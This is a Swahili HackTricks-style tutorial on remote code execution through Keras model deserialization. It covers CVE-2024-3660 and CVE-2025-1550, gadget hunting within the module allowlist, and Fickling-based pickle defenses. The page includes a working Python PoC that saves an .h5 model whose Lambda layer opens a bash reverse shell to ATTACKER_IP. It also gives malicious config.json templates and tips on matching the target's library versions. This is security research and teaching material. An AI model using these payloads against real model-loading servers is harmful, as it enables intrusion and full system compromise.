# RCE ya Keras Model Deserialization na Gadget Hunting

{{#include ../banners/hacktricks-training.md}}

Ukurasa huu unatoa muhtasari wa mbinu za vitendo za exploitation dhidi ya pipeline ya Keras model deserialization, unaeleza ndani ya format asilia ya .keras na attack surface yake, na unatoa toolkit ya watafiti ya kutafuta Model File Vulnerabilities (MFVs) na gadgets baada ya marekebisho.

## Muundo wa ndani wa .keras model

Faili la .keras ni ZIP archive lenye angalau:<sup>[[1]](#references)</sup>
- metadata.json – taarifa za jumla (kwa mfano, toleo la Keras)
- config.json – usanifu wa model (attack surface kuu)
- model.weights.h5 – weights katika HDF5

config.json huendesha deserialization ya kujirudia: Keras huingiza modules, hutatua classes/functions, na huunda upya layers/objects kutoka kwa dictionaries zinazodhibitiwa na mshambuliaji.<sup>[[1]](#references)</sup>

Mfano wa kipande cha msimbo cha object ya Dense layer:

```json
{
  "module": "keras.layers",
  "class_name": "Dense",
  "config": {
    "units": 64,
    "activation": {
      "module": "keras.activations",
      "class_name": "relu"
    },
    "kernel_initializer": {
      "module": "keras.initializers",
      "class_name": "GlorotUniform"
    }
  }
}
```

Deserialization hufanya:<sup>[[1]](#references)</sup>
- Module import na symbol resolution kutoka kwenye funguo za module/class_name
- Wito wa from_config(...) au constructor ukiwa na kwargs zinazodhibitiwa na attacker
- Kuingia kwa kina kwenye nested objects (activations, initializers, constraints, n.k.)

Kihistoria, hili lilimpa attacker primitives tatu za kutumia wakati wa kuunda config.json:<sup>[[1]](#references)</sup>
- Kudhibiti modules zitakazoingizwa
- Kudhibiti classes/functions zitakazotatuliwa
- Kudhibiti kwargs zitakazopitishwa kwa constructors/from_config

## CVE-2024-3660 – Lambda-layer bytecode RCE

Chanzo kikuu:
- Legacy Lambda deserialization iliunda upya Python function kutoka kwenye code iliyomarshaliwa inayodhibitiwa na attacker: `func_load()` hufungua payload ya base64, huita `marshal.loads()`, na kuunda `FunctionType`. Bytecode ya function inayotokana na hili hutekelezwa Lambda inapoitwa, na loaders zilizoathirika za kabla ya 2.13 hazikutekeleza ukaguzi wa safe-mode kwa legacy formats.<sup>[[3]](#references)[[16]](#references)[[17]](#references)[[18]](#references)</sup>

Katika archive asilia ya Keras v3, Lambda function huwakilishwa kama object ya `__lambda__` ambayo sehemu yake ya `code` ina code iliyomarshaliwa na kusimbwa kwa base64:<sup>[[17]](#references)[[18]](#references)</sup>

```json
{
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "exploit_lambda",
    "function": {
      "class_name": "__lambda__",
      "config": {
        "code": "<base64(marshal.dumps(function.__code__))>",
        "defaults": null,
        "closure": null
      }
    }
  }
}
```

Uzuiaji:
- Keras hutumia `safe_mode=True` kwa chaguomsingi kwa fomati asilia ya Keras v3. Lambda za Python zilizofanyiwa serialization ndani ya `Lambda` huzuiwa isipokuwa mtumiaji achague wazi kutumia `safe_mode=False`; ulinzi huu hautumiki kwa fomati za zamani kwa namna hiyo hiyo.<sup>[[1]](#references)[[16]](#references)[[17]](#references)</sup>

Maelezo:
- Fomati za zamani (hifadhi za zamani za HDF5) au codebase za zamani huenda zisitumie ukaguzi wa kisasa, kwa hiyo mashambulizi ya mtindo wa “downgrade” bado yanaweza kufanyika waathiriwa wanapotumia loaders za zamani.

## CVE-2025-1550 – Uingizaji wa moduli kiholela katika Keras 3.0.0–3.8.x

Chanzo kikuu:
- `_retrieve_class_or_fn` ilitumia `importlib.import_module(module)` kwenye mifuatano ya moduli inayodhibitiwa na mshambulizi kutoka `config.json`.
- Athari: Kumbukumbu ya `.keras` iliyotengenezwa mahsusi ingeweza kufanya `Model.load_model()` iingize moduli na functions za Python zilizochaguliwa na mshambulizi, pamoja na athari za upande zinazotokea wakati wa uingizaji na arguments zinazodhibitiwa na mshambulizi, hata ikiwa `safe_mode=True`.<sup>[[1]](#references)[[4]](#references)</sup>

Wazo la exploit:

```json
{
  "module": "maliciouspkg",
  "class_name": "Danger",
  "config": {"arg": "val"}
}
```

Maboresho ya usalama (Keras ≥ 3.9):<sup>[[1]](#references)[[2]](#references)</sup>
- Orodha ya kuruhusu module: imports zimezuiwa kwa modules rasmi za ecosystem: keras, keras_hub, keras_cv, keras_nlp
- Safe mode kwa chaguomsingi: safe_mode=True huzuia upakiaji usio salama wa serialized function za Lambda
- Ukaguzi wa msingi wa aina: objects zilizodeserialize lazima zilingane na aina zinazotarajiwa

## Unyonyaji wa vitendo: TensorFlow-Keras HDF5 (.h5) Lambda RCE

Huenda deployments za zamani za TensorFlow-Keras bado zikakubali faili za modeli za HDF5 (`.h5`). Ikiwa mshambuliaji anaweza kupakia modeli ambayo baadaye seva itapakia au kuitumia kufanya inference, loader iliyoathiriwa inaweza kudeserialize layer ya Lambda yenye Python inayodhibitiwa na mshambuliaji, ambayo inaweza kisha kutekelezwa ndani ya workflow ya modeli ya programu.<sup>[[3]](#references)[[7]](#references)[[16]](#references)</sup>

PoC fupi ya kuunda .h5 hasidi ambayo Lambda yake itatekeleza reverse shell lengwa linapoiendesha modeli:

```python
import tensorflow as tf

def exploit(x):
    import os
    os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
    return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```

Vidokezo na ushauri kuhusu kutegemewa:
- Vichochezi hutofautiana kulingana na umbizo na mtiririko wa kazi; maelezo yaliyorejelewa yalibaini kuwa payload ilitekelezwa mara mbili wakati wa prediction. Chukulia kuwa athari za pembeni zinaweza kujirudia na ufanye payload ziwe idempotent.<sup>[[7]](#references)</sup>
- Kufunga matoleo: linganisha TF/Keras/Python za mwathiriwa ili kuepuka kutolingana kwa serialization. Kwa mfano, tengeneza artifacts chini ya Python 3.8 na TensorFlow 2.13.1 ikiwa ndivyo vinavyotumiwa na lengwa.<sup>[[7]](#references)</sup>
- Kuiga mazingira kwa haraka:

```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```

- Uthibitishaji: payload isiyo na madhara kama `os.system("ping -c 1 YOUR_IP")` husaidia kuthibitisha utekelezaji (kwa mfano, kuona ICMP kwa kutumia tcpdump) kabla ya kubadilisha kuwa reverse shell.<sup>[[7]](#references)</sup>

## Uso wa gadget baada ya marekebisho ndani ya allowlist

Hata ukiwa na allowlist ya moduli ya Keras na safe mode, callables zinazoruhusiwa zinaweza kusababisha athari za pembeni. Kwa mfano, `keras.utils.get_file` hupakua URL na kuiandika chini ya eneo la cache lililosanidiwa, hivyo kuifanya kuwa chaguo la kuchanganua gadget.<sup>[[1]](#references)[[19]](#references)</sup>

Usanidi wa Lambda unaoweza kuchunguzwa (thibitisha signature ya mwito katika jaribio linalodhibitiwa):

```json
{
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "dl",
    "function": {
      "module": "keras.utils",
      "class_name": "get_file",
      "config": null,
      "registered_name": null
    },
    "arguments": {
      "origin": "https://example.com/artifact.bin",
      "cache_dir": "/tmp/keras-cache"
    }
  }
}
```

Kizuizi muhimu:
- `Lambda.call()` hupitisha ingizo la model kila mara kama argumenti ya kwanza ya positional, na `arguments` zilizosanidiwa kama argumenti za keyword. Kwa `get_file`, thamani hiyo ya positional hujazwa kwenye `fname`; kutolingana kati ya tensor na path kunaweza kusababisha candidate hii ishindwe kabla ya upakuaji wowote, kwa hiyo si gadget inayohakikishiwa kufanya kazi.<sup>[[1]](#references)[[16]](#references)[[19]](#references)</sup>

## Kuruhusu imports za ML pickle kwa models za AI/ML (Fickling)

Miundo mingi ya AI/ML (PyTorch `.pt`/`.pth`/`.ckpt`, artifacts za joblib/scikit-learn, na miundo mingine ya asili ya Python) hujumuisha data ya Python pickle. Njia ya zamani ya Keras Lambda iliyoelezwa hapo juu hutumia bytecode ya function iliyoserialishwa kwa marshal badala yake, kwa hiyo ni hatari tofauti ya deserialization. Pickle opcodes zinaweza kutekeleza tabia inayodhibitiwa na mshambuliaji wakati wa deserialization, ikiwemo uchezewaji wa model au RCE, na scanners rahisi zinaweza kukosa imports hatari ambazo ni mpya au hazijaorodheshwa.<sup>[[7]](#references)[[8]](#references)[[14]](#references)[[18]](#references)</sup>

Ulinzi wa fail-closed unaotumika kwa vitendo ni kuweka hook kwenye deserializer ya pickle ya Python na kuruhusu tu imports zisizo na madhara zinazohusiana na ML, zilizokaguliwa, wakati wa unpickling. Fickling ya Trail of Bits hutekeleza sera hii na huja na allowlist ya imports za ML iliyochaguliwa kutoka kwenye maelfu ya pickle za umma za Hugging Face.<sup>[[8]](#references)[[13]](#references)</sup>

Muundo wa usalama wa imports “salama” (uelewa uliofupishwa kutoka kwa utafiti na uzoefu wa vitendo): alama zilizoletwa ambazo pickle hutumia lazima kwa pamoja zitimize masharti yafuatayo:<sup>[[8]](#references)</sup>
- Zisieksekute code au kusababisha utekelezaji (zisiwe na code objects zilizokompailiwa/za source, kuendesha shell commands, hooks, n.k.)
- Zisifanye get/set ya attributes au items kiholela
- Zisiweze kuleta au kupata references za objects nyingine za Python kutoka kwenye pickle VM
- Zisichochee deserializers nyingine (k.m., marshal, nested pickle), hata kwa njia isiyo ya moja kwa moja

Washa ulinzi wa Fickling mapema iwezekanavyo wakati wa kuanzisha process ili mizigo yoyote ya pickle inayofanywa na frameworks (torch.load, joblib.load, n.k.) ikaguliwe:<sup>[[9]](#references)</sup>

```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```

Vidokezo vya kiutendaji:
- Unaweza kuzima/kuwasha tena hooks kwa muda pale inapohitajika:<sup>[[9]](#references)</sup>

```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```

- Ikiwa model inayojulikana kuwa salama imezuiwa, panua allowlist ya mazingira yako baada ya kukagua alama:<sup>[[9]](#references)</sup>

```python
fickling.hook.activate_safe_ml_environment(also_allow=[
    "package.subpackage.safe_symbol",
    "another.safe.import",
])
```

- Fickling pia hutoa runtime guards za jumla ikiwa unapendelea udhibiti wa kina zaidi:<sup>[[9]](#references)</sup>
  - fickling.always_check_safety() ili kutekeleza ukaguzi kwa kila pickle.load()
  - with fickling.check_safety(): kwa utekelezaji wenye wigo maalum
  - fickling.load(path) / fickling.is_likely_safe(path) kwa ukaguzi wa mara moja

- Pendelea fomati za modeli zisizotumia pickle inapowezekana (kwa mfano, SafeTensors).<sup>[[15]](#references)</sup> Ikiwa lazima ukubali pickle, endesha loaders kwa ruhusa za kiwango cha chini bila network egress na utekeleze allowlist.

Mkakati huu wa kuanza na allowlist huzuia kwa vitendo njia za kawaida za unyonyaji wa ML pickle huku ukidumisha uoanifu wa hali ya juu. Katika benchmark ya ToB, Fickling ilitambua 100% ya faili hasidi za majaribio na kuruhusu takriban 99% ya faili safi kutoka kwenye repos maarufu za Hugging Face.<sup>[[8]](#references)[[10]](#references)</sup>


## Zana za mtafiti

1) Ugunduzi wa kimfumo wa gadgets katika modules zinazoruhusiwa

Orodhesha callables zinazoweza kutumika katika keras, keras_nlp, keras_cv, keras_hub na uzitangulize zile zenye athari za file/network/process/env.<sup>[[1]](#references)</sup>

<details>
<summary>Orodhesha callables zinazoweza kuwa hatari katika modules za Keras zilizo kwenye allowlist</summary>

```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
    if not hasattr(mod, "__path__"):
        return
    for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
        yield m.name

candidates = []
for root in ALLOWLIST:
    try:
        r = importlib.import_module(root)
    except Exception:
        continue
    for name in iter_modules(r):
        if name in seen:
            continue
        seen.add(name)
        try:
            m = importlib.import_module(name)
        except Exception:
            continue
        for n, obj in inspect.getmembers(m):
            if inspect.isfunction(obj) or inspect.isclass(obj):
                sig = None
                try:
                    sig = str(inspect.signature(obj))
                except Exception:
                    pass
                doc = (inspect.getdoc(obj) or "").lower()
                text = f"{name}.{n} {sig} :: {doc}"
                # Heuristics: look for I/O or network-ish hints
                if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
                    candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```

</details>

2) Jaribio la deserialization ya moja kwa moja (hakuna archive ya .keras inayohitajika)

Pitisha dicts zilizoundwa kimakusudi moja kwa moja kwa deserializers za Keras ili kubaini params zinazokubaliwa na kuchunguza athari za pembeni.<sup>[[1]](#references)</sup>

```python
import keras

cfg = {
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "probe",
    "function": {
      "module": "keras.utils",
      "class_name": "get_file",
      "config": null,
      "registered_name": null
    },
    "arguments": {
      "origin": "https://example.com/x",
      "cache_dir": "/tmp/keras-cache"
    }
  }
}

layer = keras.saving.deserialize_keras_object(cfg, safe_mode=True)  # Observe behavior
```

3) Uchunguzi wa matoleo tofauti na fomati

Keras ipo katika codebase/miaka tofauti, ikiwa na guardrails na fomati tofauti:<sup>[[1]](#references)</sup>
- TensorFlow built-in Keras: tensorflow/python/keras (ya zamani, imepangwa kufutwa)
- tf-keras: inadumishwa kivyake
- Multi-backend Keras 3 (rasmi): ilianzisha fomati asilia ya .keras

Rudia majaribio katika codebase na fomati tofauti (.keras dhidi ya HDF5 ya zamani) ili kubaini regressions au guardrails zinazokosekana.

## References

- [1] [Kuwinda udhaifu katika Keras Model Deserialization (blogu ya huntr)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [Keras PR #20751 – Iliongeza ukaguzi kwenye serialization](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 – RCE kupitia Keras Lambda deserialization](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 – Uingizaji wa module kiholela wa Keras (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [Ripoti ya huntr – uingizaji kiholela #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [Ripoti ya huntr – uingizaji kiholela #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial – TensorFlow .h5 Lambda RCE hadi root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [Blogu ya Trail of Bits – kichanganuzi kipya cha faili za AI/ML pickle cha Fickling](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling – Kulinda mazingira ya AI/ML (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [Korpasi ya benchmark ya uchanganuzi wa pickle ya Fickling](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [Utangulizi wa mashambulizi ya Sleepy Pickle](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [Mradi wa SafeTensors](https://github.com/safetensors/safetensors)
- [16] [CERT/CC VU#253266 – Keras 2 Lambda Layers huruhusu uingizaji holela wa msimbo](https://kb.cert.org/vuls/id/253266)
- [17] [Chanzo cha Keras Lambda layer (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/layers/core/lambda_layer.py)
- [18] [Chanzo cha Keras Python utilities (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/utils/python_utils.py)
- [19] [API ya Keras `get_file`](https://keras.io/api/utils/python_utils/#get_file-function)
{{#include ../banners/hacktricks-training.md}}
